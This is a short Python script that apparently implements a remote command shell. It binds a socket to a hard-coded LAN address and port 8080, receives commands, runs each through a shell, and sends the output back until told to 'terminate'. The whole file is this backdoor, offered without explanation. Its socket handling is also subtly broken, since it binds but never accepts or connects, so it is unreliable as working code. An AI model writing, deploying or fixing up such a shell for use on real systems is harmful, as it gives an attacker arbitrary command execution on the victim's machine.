import socket
import subprocess

def con():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(("192.168.1.101",8080))

    while True:
        command = soc.recv(1024)

        if 'terminate' in command:
            soc.close()
            break
        
        else:

            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE) 
            soc.send(CMD.stdout.read() )
            soc.send(CMD.stderr.read() )

def main():
    con()
main()